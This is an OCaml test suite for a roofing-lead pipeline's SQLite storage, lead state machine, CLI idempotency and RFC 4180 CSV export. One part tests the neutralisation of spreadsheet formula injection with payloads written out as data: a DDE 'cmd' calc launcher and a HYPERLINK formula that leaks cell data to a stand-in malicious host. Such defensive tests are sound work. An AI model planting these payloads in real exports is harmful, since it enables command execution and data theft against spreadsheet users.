(**
   test_m4_2_challenger.ml - Persistence & Export Challenger Stress Test Suite.
   Verifies:
     1. SQLite schema creation, WAL journal mode, and index generation.
     2. Lead state machine lifecycle transitions (Discovered -> Enriched -> Validated/Disqualified -> Exported).
     3. CLI pipeline execution idempotency across repeat runs on identical databases.
     4. RFC 4180 CSV export schema, 10 required columns in strict sequence.
     5. Exported lead Status column invariance ("VALIDATED").
     6. Spreadsheet formula injection neutralization across diverse attack vectors.
     7. Canonical telephone formatting and rejection of malicious prefixes.
*)

[@@@warning "-32-33-27-35-26"]

open Roof_engine
open Types

let passed_count = ref 0
let failed_count = ref 0

(** [assert_true label cond] records a passing assertion if cond is true, else records a failure. *)
let assert_true (label : string) (cond : bool) =
  if cond then (
    incr passed_count;
    Printf.printf "  [PASS] %s\n%!" label
  ) else (
    incr failed_count;
    Printf.printf "  [FAIL] %s\n%!" label
  )

(** [assert_equal_int label expected actual] verifies integer equality. *)
let assert_equal_int (label : string) (expected : int) (actual : int) =
  if expected = actual then (
    incr passed_count;
    Printf.printf "  [PASS] %s (expected %d, got %d)\n%!" label expected actual
  ) else (
    incr failed_count;
    Printf.printf "  [FAIL] %s (expected %d, got %d)\n%!" label expected actual
  )

(** [assert_equal_string label expected actual] verifies string equality. *)
let assert_equal_string (label : string) (expected : string) (actual : string) =
  if expected = actual then (
    incr passed_count;
    Printf.printf "  [PASS] %s\n%!" label
  ) else (
    incr failed_count;
    Printf.printf "  [FAIL] %s (expected %S, got %S)\n%!" label expected actual
  )

(** [assert_equal_string_opt label expected actual] verifies optional string equality. *)
let assert_equal_string_opt (label : string) (expected : string option) (actual : string option) =
  if expected = actual then (
    incr passed_count;
    Printf.printf "  [PASS] %s\n%!" label
  ) else (
    incr failed_count;
    let fmt = function Some s -> Printf.sprintf "Some %S" s | None -> "None" in
    Printf.printf "  [FAIL] %s (expected %s, got %s)\n%!" label (fmt expected) (fmt actual)
  )

(** [assert_contains label needle haystack] verifies substring presence. *)
let assert_contains (label : string) (needle : string) (haystack : string) =
  let len_n = String.length needle in
  let len_h = String.length haystack in
  let rec search i =
    if i + len_n > len_h then false
    else if String.sub haystack i len_n = needle then true
    else search (i + 1)
  in
  if search 0 then (
    incr passed_count;
    Printf.printf "  [PASS] %s\n%!" label
  ) else (
    incr failed_count;
    Printf.printf "  [FAIL] %s (needle %S not found)\n%!" label needle
  )

(** [resolve_main_exe ()] locates the compiled CLI executable for testing. *)
let resolve_main_exe () : string =
  let candidates = [
    "../bin/main.exe";
    "./_build/default/bin/main.exe";
    "ocaml/_build/default/bin/main.exe";
    "/Users/solveetcoagula/Desktop/activeProjects/Roo4u/ocaml/_build/default/bin/main.exe";
  ] in
  match List.find_opt Sys.file_exists candidates with
  | Some path -> path
  | None -> "roof_pipeline"

(** [run_cli args] executes the compiled CLI binary with specified arguments and captures output. *)
let run_cli (args : string list) : int * string * string =
  let exe = resolve_main_exe () in
  let quoted_args = List.map Filename.quote args in
  let stdout_file = Filename.temp_file "challenger_cli_stdout_" ".txt" in
  let stderr_file = Filename.temp_file "challenger_cli_stderr_" ".txt" in
  let cmd = Printf.sprintf "%s %s > %s 2> %s"
    (Filename.quote exe)
    (String.concat " " quoted_args)
    (Filename.quote stdout_file)
    (Filename.quote stderr_file)
  in
  let raw_status = Sys.command cmd in
  let exit_code =
    match raw_status with
    | 0 -> 0
    | 256 -> 1
    | 512 -> 2
    | n when n land 0xFF = 0 -> n lsr 8
    | n -> n
  in
  let read_all path =
    if Sys.file_exists path then
      let ic = open_in path in
      let len = in_channel_length ic in
      let s = really_input_string ic len in
      close_in ic;
      (try Sys.remove path with _ -> ());
      s
    else ""
  in
  let stdout_content = read_all stdout_file in
  let stderr_content = read_all stderr_file in
  (exit_code, stdout_content, stderr_content)

(** [parse_csv_line line] splits a CSV line into fields adhering to RFC 4180 quoting rules. *)
let parse_csv_line (line : string) : string list =
  let len = String.length line in
  let rec parse_field idx acc_fields =
    if idx >= len then List.rev ("" :: acc_fields)
    else if line.[idx] = '"' then
      parse_quoted (idx + 1) (Buffer.create 32) acc_fields
    else
      parse_unquoted idx (Buffer.create 32) acc_fields
  and parse_quoted idx buf acc_fields =
    if idx >= len then
      List.rev (Buffer.contents buf :: acc_fields)
    else if line.[idx] = '"' then
      if idx + 1 < len && line.[idx + 1] = '"' then (
        Buffer.add_char buf '"';
        parse_quoted (idx + 2) buf acc_fields
      ) else (
        skip_comma (idx + 1) (Buffer.contents buf :: acc_fields)
      )
    else (
      Buffer.add_char buf line.[idx];
      parse_quoted (idx + 1) buf acc_fields
    )
  and parse_unquoted idx buf acc_fields =
    if idx >= len then
      List.rev (Buffer.contents buf :: acc_fields)
    else if line.[idx] = ',' then
      parse_field (idx + 1) (Buffer.contents buf :: acc_fields)
    else (
      Buffer.add_char buf line.[idx];
      parse_unquoted (idx + 1) buf acc_fields
    )
  and skip_comma idx acc_fields =
    if idx >= len then List.rev acc_fields
    else if line.[idx] = ',' then parse_field (idx + 1) acc_fields
    else skip_comma (idx + 1) acc_fields
  in
  if line = "" then [] else parse_field 0 []

(** [make_sample_lead address zip] constructs a sample lead record for test fixtures. *)
let make_sample_lead ?(property_type = SingleFamily) ?(roof_type = Victorian) ?(value = Some 2500000.0) ?(owner = Some "Presidio Trust") ?(phone = Some "415-346-1000") (address : string) (zip : string) : raw_lead =
  {
    address;
    zip_code = zip;
    property_type;
    roof_type;
    property_type_raw = Some (Types.string_of_property_type property_type);
    roof_type_raw = Some (Types.string_of_roof_type roof_type);
    estimated_value = value;
    owner_name = owner;
    is_hoa = false;
    is_rental = false;
    apn = Some "0123-456";
    last_roof_permit_date = Some "1995-04-10";
    roof_age_years = Some 31.0;
    year_built = Some 1900;
    phone_number = phone;
    permits = [];
  }

(** [test_sqlite_schema_wal_and_indices ()] verifies SQLite schema, WAL mode, and required indexes. *)
let test_sqlite_schema_wal_and_indices () =
  Printf.printf "\n=== SUITE 1: SQLite Schema, WAL Mode & Index Verification ===\n%!";
  let temp_db = Filename.temp_file "test_challenger_schema_" ".sqlite" in
  let db = Db.create ~db_path:temp_db () in

  let wal_res = Db.run_sqlite_cmd temp_db "PRAGMA journal_mode;" in
  (match wal_res with
   | Ok mode ->
       assert_equal_string "SQLITE.WAL.0: Database operates in WAL journal mode" "wal" (String.lowercase_ascii (String.trim mode))
   | Error err ->
       assert_true ("SQLITE.WAL.0: Query failed: " ^ err) false);

  let check_index name col =
    let q = Printf.sprintf "SELECT count(*) FROM sqlite_master WHERE type='index' AND name='%s';" name in
    match Db.run_sqlite_cmd temp_db q with
    | Ok c ->
        assert_equal_string (Printf.sprintf "SQLITE.INDEX.%s: Index exists on column %s" name col) "1" (String.trim c)
    | Error err ->
        assert_true (Printf.sprintf "SQLITE.INDEX.%s query failed: %s" name err) false
  in
  check_index "idx_leads_address" "address";
  check_index "idx_leads_zip" "zip_code";
  check_index "idx_leads_status" "status";

  let col_res = Db.run_sqlite_cmd temp_db "PRAGMA table_info(leads);" in
  (match col_res with
   | Ok info ->
       assert_contains "SQLITE.SCHEMA.COL.id: Primary key id column present" "id" info;
       assert_contains "SQLITE.SCHEMA.COL.address: address column present" "address" info;
       assert_contains "SQLITE.SCHEMA.COL.zip_code: zip_code column present" "zip_code" info;
       assert_contains "SQLITE.SCHEMA.COL.property_type: property_type column present" "property_type" info;
       assert_contains "SQLITE.SCHEMA.COL.roof_type: roof_type column present" "roof_type" info;
       assert_contains "SQLITE.SCHEMA.COL.estimated_value: estimated_value column present" "estimated_value" info;
       assert_contains "SQLITE.SCHEMA.COL.owner_name: owner_name column present" "owner_name" info;
       assert_contains "SQLITE.SCHEMA.COL.is_hoa: is_hoa column present" "is_hoa" info;
       assert_contains "SQLITE.SCHEMA.COL.is_rental: is_rental column present" "is_rental" info;
       assert_contains "SQLITE.SCHEMA.COL.apn: apn column present" "apn" info;
       assert_contains "SQLITE.SCHEMA.COL.last_roof_permit_date: last_roof_permit_date column present" "last_roof_permit_date" info;
       assert_contains "SQLITE.SCHEMA.COL.roof_age_years: roof_age_years column present" "roof_age_years" info;
       assert_contains "SQLITE.SCHEMA.COL.phone_number: phone_number column present" "phone_number" info;
       assert_contains "SQLITE.SCHEMA.COL.status: status column present" "status" info
   | Error err ->
       assert_true ("SQLITE.SCHEMA: Query failed: " ^ err) false);

  Db.init_db db;
  Db.init_db db;
  let wal_res_repeat = Db.run_sqlite_cmd temp_db "PRAGMA journal_mode;" in
  (match wal_res_repeat with
   | Ok mode ->
       assert_equal_string "SQLITE.IDEMP.INIT: Repeated init_db preserves WAL mode" "wal" (String.lowercase_ascii (String.trim mode))
   | Error err ->
       assert_true ("SQLITE.IDEMP.INIT error: " ^ err) false);

  let lead = make_sample_lead "3000 Clay St" "94115" in
  let ins_res = Db.insert_lead db ~status:Db.Discovered lead in
  assert_true "SQLITE.INSERT.0: Initial insert returns Ok id" (Result.is_ok ins_res);

  let dup_sql = "INSERT INTO leads (address, zip_code) VALUES ('3000 Clay St', '94115');" in
  let dup_res = Db.run_sqlite_cmd temp_db dup_sql in
  assert_true "SQLITE.UNIQUE.ADDR: Database enforces unique address constraint" (Result.is_error dup_res);

  (try Sys.remove temp_db with _ -> ());
  (try Sys.remove (temp_db ^ "-wal") with _ -> ());
  (try Sys.remove (temp_db ^ "-shm") with _ -> ())

(** [test_state_machine_lifecycle ()] verifies transitions through Discovered -> Enriched -> Validated/Disqualified -> Exported. *)
let test_state_machine_lifecycle () =
  Printf.printf "\n=== SUITE 2: State Machine Lifecycle Transitions ===\n%!";
  let temp_db = Filename.temp_file "test_challenger_fsm_" ".sqlite" in
  let db = Db.create ~db_path:temp_db () in

  let lead_a = make_sample_lead "2500 Pacific Ave" "94115" in
  let ins_a = Db.insert_lead db ~status:Db.Discovered lead_a in
  assert_true "FSM.DISCOVERED.0: Lead inserted in DISCOVERED state" (Result.is_ok ins_a);

  let row_opt = Db.get_lead_by_address db "2500 Pacific Ave" in
  assert_true "FSM.DISCOVERED.1: Lead retrievable by address" (Option.is_some row_opt);
  let row = Option.get row_opt in
  assert_equal_string "FSM.DISCOVERED.2: Status is DISCOVERED" "DISCOVERED" row.status;

  let enrich_res = Db.update_enriched db "2500 Pacific Ave"
    ~phone_number:"415-346-5555"
    ~estimated_value:4100000.0
    ~owner_name:"Pacific Heights Trust"
    ()
  in
  assert_true "FSM.ENRICHED.0: update_enriched returns Ok" (Result.is_ok enrich_res);
  let enriched_row = Option.get (Db.get_lead_by_address db "2500 Pacific Ave") in
  assert_equal_string "FSM.ENRICHED.1: Status transitions to ENRICHED" "ENRICHED" enriched_row.status;
  assert_equal_string_opt "FSM.ENRICHED.2: Phone number stored" (Some "415-346-5555") enriched_row.phone_number;

  let val_res = Db.update_status db "2500 Pacific Ave" Db.Validated in
  assert_true "FSM.VALIDATED.0: update_status Validated returns Ok" (Result.is_ok val_res);
  let validated_row = Option.get (Db.get_lead_by_address db "2500 Pacific Ave") in
  assert_equal_string "FSM.VALIDATED.1: Status transitions to VALIDATED" "VALIDATED" validated_row.status;

  let exp_res = Db.update_status db "2500 Pacific Ave" Db.Exported in
  assert_true "FSM.EXPORTED.0: update_status Exported returns Ok" (Result.is_ok exp_res);
  let exported_row = Option.get (Db.get_lead_by_address db "2500 Pacific Ave") in
  assert_equal_string "FSM.EXPORTED.1: Status transitions to EXPORTED" "EXPORTED" exported_row.status;

  let lead_b = make_sample_lead "100 Commercial Blvd" "94105" ~value:(Some 500000.0) in
  let ins_b = Db.insert_lead db ~status:Db.Discovered lead_b in
  assert_true "FSM.DISQ.0: Disqualified candidate inserted" (Result.is_ok ins_b);
  ignore (Db.update_enriched db "100 Commercial Blvd" ());
  let disq_res = Db.update_status db "100 Commercial Blvd" Db.Disqualified in
  assert_true "FSM.DISQ.1: Lead transitions to DISQUALIFIED" (Result.is_ok disq_res);
  let disq_row = Option.get (Db.get_lead_by_address db "100 Commercial Blvd") in
  assert_equal_string "FSM.DISQ.2: Status is DISQUALIFIED" "DISQUALIFIED" disq_row.status;

  let missing_status = Db.update_status db "9999 Ghost St" Db.Validated in
  assert_true "FSM.ERR.MISSING: Updating status of nonexistent lead returns Error" (Result.is_error missing_status);
  let missing_enrich = Db.update_enriched db "9999 Ghost St" () in
  assert_true "FSM.ERR.ENRICH_MISSING: Updating enrichment of nonexistent lead returns Error" (Result.is_error missing_enrich);

  let lead_special = make_sample_lead "450 O'Farrell St #3A" "94102" ~owner:(Some "Patrick O'Connor & Sean O'Reilly") in
  let ins_special = Db.insert_lead db ~status:Db.Discovered lead_special in
  assert_true "FSM.SPECIAL.INSERT: Single quote escaping in address and owner succeeds" (Result.is_ok ins_special);
  ignore (Db.update_enriched db "450 O'Farrell St #3A" ~owner_name:"Patrick O'Connor & Sean O'Reilly" ());
  ignore (Db.update_status db "450 O'Farrell St #3A" Db.Validated);

  let db_reopened = Db.create ~db_path:temp_db () in
  let retrieved_special = Db.get_lead_by_address db_reopened "450 O'Farrell St #3A" in
  assert_true "FSM.SPECIAL.RELOAD: Single quote lead preserved across DB reload" (Option.is_some retrieved_special);
  let spec_row = Option.get retrieved_special in
  assert_equal_string_opt "FSM.SPECIAL.OWNER: Owner name with single quotes intact" (Some "Patrick O'Connor & Sean O'Reilly") spec_row.owner_name;
  assert_equal_string "FSM.SPECIAL.STATUS: Status preserved across reload" "VALIDATED" spec_row.status;

  let dup_lead = make_sample_lead "2500 Pacific Ave" "94115" in
  let dup_insert = Db.insert_lead db dup_lead in
  assert_true "FSM.DUP.INSERT: Inserting duplicate address returns Error" (Result.is_error dup_insert);

  let empty_lead = make_sample_lead "" "94115" in
  let empty_insert = Db.insert_lead db empty_lead in
  assert_true "FSM.EMPTY.INSERT: Inserting empty address returns Error" (Result.is_error empty_insert);

  let lower_retrieval = Db.get_lead_by_address db "2500 pacific ave" in
  assert_true "FSM.CASE.GET: Address query is case-insensitive" (Option.is_some lower_retrieval);

  (try Sys.remove temp_db with _ -> ());
  (try Sys.remove (temp_db ^ "-wal") with _ -> ());
  (try Sys.remove (temp_db ^ "-shm") with _ -> ())

(** [test_cli_pipeline_idempotency ()] verifies row count stability and duplicate prevention upon repeat execution. *)
let test_cli_pipeline_idempotency () =
  Printf.printf "\n=== SUITE 3: CLI Pipeline Execution Idempotency ===\n%!";
  let temp_db = Filename.temp_file "test_challenger_idemp_" ".sqlite" in
  let temp_csv = Filename.temp_file "test_challenger_idemp_" ".csv" in

  let run_cmd () =
    run_cli [
      "--run";
      "--zips"; "94123";
      "--limit"; "5";
      "--db"; temp_db;
      "--csv"; temp_csv;
      "--min-score"; "60.0";
    ]
  in

  let (code1, _, stderr1) = run_cmd () in
  assert_equal_int "CLI.IDEMP.RUN1.CODE: First pipeline run exits with 0" 0 code1;
  if code1 <> 0 then Printf.printf "    Stderr: %s\n" stderr1;

  let db1 = Db.create ~db_path:temp_db () in
  let count_res1 = Db.run_sqlite_cmd temp_db "SELECT count(*) FROM leads;" in
  let rows_count1 =
    match count_res1 with
    | Ok c -> int_of_string (String.trim c)
    | Error _ -> 0
  in
  assert_true "CLI.IDEMP.RUN1.COUNT: First run stored rows in SQLite" (rows_count1 > 0);

  let read_csv_lines file =
    let lines = ref [] in
    if Sys.file_exists file then (
      let ic = open_in file in
      (try
        while true do
          lines := input_line ic :: !lines
        done
      with End_of_file -> close_in ic)
    );
    List.rev !lines
  in
  let csv_lines1 = read_csv_lines temp_csv in
  let csv_rows1 = List.length csv_lines1 in
  assert_true "CLI.IDEMP.RUN1.CSV: CSV generated with header and records" (csv_rows1 >= 2);

  let (code2, _, stderr2) = run_cmd () in
  assert_equal_int "CLI.IDEMP.RUN2.CODE: Second pipeline run exits with 0" 0 code2;
  if code2 <> 0 then Printf.printf "    Stderr: %s\n" stderr2;

  let count_res2 = Db.run_sqlite_cmd temp_db "SELECT count(*) FROM leads;" in
  let rows_count2 =
    match count_res2 with
    | Ok c -> int_of_string (String.trim c)
    | Error _ -> -1
  in
  assert_equal_int "CLI.IDEMP.RUN2.STABILITY: Database row count unchanged after rerun" rows_count1 rows_count2;

  let dup_check = Db.run_sqlite_cmd temp_db "SELECT count(*) FROM (SELECT address FROM leads GROUP BY address HAVING count(*) > 1);" in
  (match dup_check with
   | Ok count_str ->
       assert_equal_string "CLI.IDEMP.NO_DUPS: Zero duplicate addresses in database" "0" (String.trim count_str)
   | Error err ->
       assert_true ("CLI.IDEMP.NO_DUPS query failed: " ^ err) false);

  let csv_lines2 = read_csv_lines temp_csv in
  let csv_rows2 = List.length csv_lines2 in
  assert_equal_int "CLI.IDEMP.CSV_STABILITY: CSV row count unchanged after rerun" csv_rows1 csv_rows2;

  let (code3, _, _) =
    run_cli [
      "--run";
      "--neighborhood"; "Marina";
      "--limit"; "5";
      "--db"; temp_db;
      "--csv"; temp_csv;
      "--min-score"; "60.0";
    ]
  in
  assert_equal_int "CLI.IDEMP.RUN3.CODE: Third run with overlapping neighborhood exits with 0" 0 code3;
  let dup_check3 = Db.run_sqlite_cmd temp_db "SELECT count(*) FROM (SELECT address FROM leads GROUP BY address HAVING count(*) > 1);" in
  (match dup_check3 with
   | Ok count_str ->
       assert_equal_string "CLI.IDEMP.NO_DUPS_RUN3: Zero duplicate addresses after third overlapping run" "0" (String.trim count_str)
   | Error err ->
       assert_true ("CLI.IDEMP.NO_DUPS_RUN3 query failed: " ^ err) false);

  (try Sys.remove temp_db with _ -> ());
  (try Sys.remove (temp_db ^ "-wal") with _ -> ());
  (try Sys.remove (temp_db ^ "-shm") with _ -> ());
  (try Sys.remove temp_csv with _ -> ())

(** [test_rfc4180_csv_export ()] validates the 10-column schema, Status column, and field order. *)
let test_rfc4180_csv_export () =
  Printf.printf "\n=== SUITE 4: RFC 4180 CSV Export Schema & Status Column ===\n%!";
  let expected_headers = [
    "Address";
    "Zip Code";
    "Property Type";
    "Roof Type";
    "Assessed Value";
    "Owner Name";
    "APN";
    "Roof Age (Years)";
    "Phone Number";
    "Status";
  ] in
  assert_equal_int "CSV.SCHEMA.COL_COUNT: Header list has exactly 10 columns" 10 (List.length Csv_exporter.headers);
  List.iteri (fun idx expected_col ->
    let actual_col = List.nth Csv_exporter.headers idx in
    assert_equal_string (Printf.sprintf "CSV.SCHEMA.ORDER.%d: Column %s in position %d" idx expected_col idx) expected_col actual_col
  ) expected_headers;

  let expected_header_str = "Address,Zip Code,Property Type,Roof Type,Assessed Value,Owner Name,APN,Roof Age (Years),Phone Number,Status\n" in
  assert_equal_string "CSV.SCHEMA.HEADER_STR: Comma-separated header string matches contract" expected_header_str Csv_exporter.header_string;

  let temp_db = Filename.temp_file "test_challenger_csv_db_" ".sqlite" in
  let temp_csv = Filename.temp_file "test_challenger_csv_out_" ".csv" in
  let db = Db.create ~db_path:temp_db () in

  let lead1 = make_sample_lead "100 Presidio Ave" "94115" in
  let lead2 = make_sample_lead "200 Marina Blvd" "94123" in
  ignore (Db.insert_lead db ~status:Db.Validated lead1);
  ignore (Db.insert_lead db ~status:Db.Exported lead2);

  let exported_count = Csv_exporter.export_from_db ~min_score:60.0 db ~output_file:temp_csv in
  assert_equal_int "CSV.EXPORT.COUNT: Two leads exported from DB" 2 exported_count;
  assert_true "CSV.FILE.EXISTS: CSV file written to disk" (Sys.file_exists temp_csv);

  let ic = open_in temp_csv in
  let header_line = input_line ic in
  assert_equal_string "CSV.FILE.HEADER: Header row matches RFC 4180 required 10 columns"
    "Address,Zip Code,Property Type,Roof Type,Assessed Value,Owner Name,APN,Roof Age (Years),Phone Number,Status"
    header_line;

  let rec check_rows row_idx =
    try
      let line = input_line ic in
      let fields = parse_csv_line line in
      assert_equal_int (Printf.sprintf "CSV.ROW.%d.FIELDS: Exactly 10 fields parsed" row_idx) 10 (List.length fields);
      let status_field = List.nth fields 9 in
      assert_equal_string (Printf.sprintf "CSV.ROW.%d.STATUS: Status column is VALIDATED" row_idx) "VALIDATED" status_field;
      check_rows (row_idx + 1)
    with End_of_file -> ()
  in
  check_rows 1;
  close_in ic;

  let test_status_mapping status_in expected_out =
    let dummy_row : Db.lead_row = {
      id = 1;
      address = "500 California St";
      zip_code = "94104";
      property_type = Some "Single-Family";
      roof_type = Some "Victorian";
      estimated_value = Some 3000000.0;
      owner_name = Some "Sample Owner";
      is_hoa = false;
      is_rental = false;
      apn = Some "001-002";
      last_roof_permit_date = Some "1990-01-01";
      roof_age_years = Some 36.0;
      phone_number = Some "415-346-1234";
      created_at = "2026-01-01";
      status = status_in;
    } in
    let cols = Csv_exporter.row_of_db_row dummy_row in
    let status_cell = List.nth cols 9 in
    assert_equal_string (Printf.sprintf "CSV.STATUS.MAP.%s: Produces %s" status_in expected_out) expected_out status_cell
  in
  test_status_mapping "VALIDATED" "VALIDATED";
  test_status_mapping "EXPORTED" "VALIDATED";
  test_status_mapping "QUALIFIED" "VALIDATED";
  test_status_mapping "ENRICHED" "VALIDATED";
  test_status_mapping "DISQUALIFIED" "DISQUALIFIED";
  test_status_mapping "DISCARDED" "DISCARDED";

  (try Sys.remove temp_db with _ -> ());
  (try Sys.remove (temp_db ^ "-wal") with _ -> ());
  (try Sys.remove (temp_db ^ "-shm") with _ -> ());
  (try Sys.remove temp_csv with _ -> ())

(** [test_formula_injection_and_phone_sanitization ()] stress-tests DDE injection vectors and canonical phone handling. *)
let test_formula_injection_and_phone_sanitization () =
  Printf.printf "\n=== SUITE 5: Formula Injection Defense & Canonical Phone Export ===\n%!";

  let check_dde label raw expected =
    let sanitized = Csv_exporter.sanitize_csv_field raw in
    assert_equal_string (label ^ ": Sanitized formula") expected sanitized
  in
  check_dde "DDE.EQUAL" "=cmd|' /C calc'!A0" "'=cmd|' /C calc'!A0";
  check_dde "DDE.PLUS" "+1-800-POISON" "'+1-800-POISON";
  check_dde "DDE.MINUS" "-5+3+cmd" "'-5+3+cmd";
  check_dde "DDE.AT" "@SUM(1,2)" "'@SUM(1,2)";
  check_dde "DDE.TAB" "\t=calc" "'\t=calc";
  check_dde "DDE.CR" "\r=calc" "'\r=calc";
  check_dde "DDE.WHITESPACE_EQ" "   =2+2" "'   =2+2";
  check_dde "DDE.WHITESPACE_PLUS" "  +cmd" "'  +cmd";
  check_dde "DDE.WHITESPACE_AT" " \t @SUM" "' \t @SUM";

  let dde_hyperlink = "=HYPERLINK(\"http://malicious.org/leak?data=\"&A1, \"Click\")" in
  let formatted_cell = Csv_exporter.format_csv_cell dde_hyperlink in
  assert_contains "DDE.HYPERLINK.QUOTE: Formula wrapped in quotes" "\"" formatted_cell;
  assert_contains "DDE.HYPERLINK.PREFIX: Leading apostrophe neutralizes execution" "'=HYPERLINK" formatted_cell;

  let normal_lead = make_sample_lead "500 Pine St" "94108" ~phone:(Some "415-346-7788") in
  let normal_row = Csv_exporter.row_of_raw_lead normal_lead in
  let phone_col = List.nth normal_row 8 in
  assert_equal_string "PHONE.CANONICAL.RAW: Clean canonical phone has no quotes or apostrophe" "415-346-7788" phone_col;

  let norm_res = Phone_validator.sanitize_and_normalize "+1 (415) 346-7788" in
  assert_true "PHONE.CANONICAL.NORM: International +1 normalized to canonical digits" (Result.is_ok norm_res);
  let vp = Result.get_ok norm_res in
  assert_equal_string "PHONE.CANONICAL.FORMAT: Canonical format is NPA-NXX-XXXX" "415-346-7788" vp.canonical;

  let formula_phone_1 = Phone_validator.sanitize_and_normalize "=4153467788" in
  assert_true "PHONE.INJECTION.EQ: Equals prefix rejected by validator" (Result.is_error formula_phone_1);
  let formula_phone_2 = Phone_validator.sanitize_and_normalize "@4153467788" in
  assert_true "PHONE.INJECTION.AT: At prefix rejected by validator" (Result.is_error formula_phone_2);
  let formula_phone_3 = Phone_validator.sanitize_and_normalize "\t=4153467788" in
  assert_true "PHONE.INJECTION.TAB_EQ: Tab followed by equals rejected by validator" (Result.is_error formula_phone_3);
  let norm_tab = Phone_validator.sanitize_and_normalize "\t415-346-7788\r" in
  assert_true "PHONE.CANONICAL.TAB: Leading tab and trailing CR cleaned to canonical" (Result.is_ok norm_tab);
  let vp_tab = Result.get_ok norm_tab in
  assert_equal_string "PHONE.CANONICAL.TAB_FMT: Canonical digits formatted without whitespace" "415-346-7788" vp_tab.canonical;

  let dirty_lead = make_sample_lead "=123 Exploit Way" "94115"
    ~owner:(Some "@MaliciousOwner")
    ~phone:(Some "+1-800-MALWARE")
  in
  let dirty_row = Csv_exporter.row_of_raw_lead dirty_lead in
  let addr_cell = List.nth dirty_row 0 in
  let owner_cell = List.nth dirty_row 5 in
  let phone_cell = List.nth dirty_row 8 in
  assert_equal_string "CSV.ROW.DDE.ADDR: Address formula neutralized" "'=123 Exploit Way" addr_cell;
  assert_equal_string "CSV.ROW.DDE.OWNER: Owner formula neutralized" "'@MaliciousOwner" owner_cell;
  assert_equal_string "CSV.ROW.DDE.PHONE: Plus prefix formula neutralized in phone field" "'+1-800-MALWARE" phone_cell

let () =
  Printf.printf "======================================================================\n";
  Printf.printf " Roo4u Milestone 4.2: Persistence & Export Challenger Stress Suite\n";
  Printf.printf "======================================================================\n%!";

  test_sqlite_schema_wal_and_indices ();
  test_state_machine_lifecycle ();
  test_cli_pipeline_idempotency ();
  test_rfc4180_csv_export ();
  test_formula_injection_and_phone_sanitization ();

  Printf.printf "\n======================================================================\n";
  Printf.printf " CHALLENGER 4.2 SUMMARY: %d Passed, %d Failed\n" !passed_count !failed_count;
  Printf.printf "======================================================================\n%!";

  if !failed_count > 0 then exit 1 else exit 0
